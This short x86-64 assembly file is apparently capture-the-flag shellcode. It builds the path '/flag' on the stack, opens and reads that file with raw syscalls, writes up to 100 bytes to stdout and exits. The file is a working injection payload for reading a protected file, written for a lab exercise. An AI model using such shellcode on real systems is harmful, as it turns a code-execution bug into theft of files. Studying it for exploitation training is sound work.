section .text
global _start

_start:
	; We have to do some stack tricks instead of static variables
	mov dword [rsp], '/fla'		; Place the file pathname on the stack
	push 'g'			; Push 'g' onto the stack
	pop rcx				; Pop 'g' into rcx
	mov [rsp + 4], ecx		; Store 'g' after '/fla'

	; open a file and accociate it with an fd
	lea rdi, [rsp]			; Load effective address of the stack
	xor rsi, rsi			; Clear rsi (opening flags not required) O_RDONLY
	mov rax, 2			; rax for sys_open
	syscall

	mov rbx, rax			; Store FD in rbx
	
	; read from opened fd
	lea rsi, [rsp]			; rsi is the buffer to which we read
	mov rdi, rbx			; rdi receives the FD
	mov rdx, 100			; rdx defines the maximum bytes to read
	mov rax, 0			; rax for sys_read
	syscall
	
	; write to stdout	
	lea rsi, [rsp]			; rsi points to the buffer
	mov rdi, 1			; rdi represents stdout (File Descriptor 1)
	mov rdx, rax			; rdx gets the number of bytes read
	mov rax, 1			; rax for sys_write
	syscall
	
	; exit the shellcode
	mov rax, 60        		;system call number (sys_exit)
	xor rdi, rdi			; Clear rdi (exit status 0)
	syscall            		;call kernel

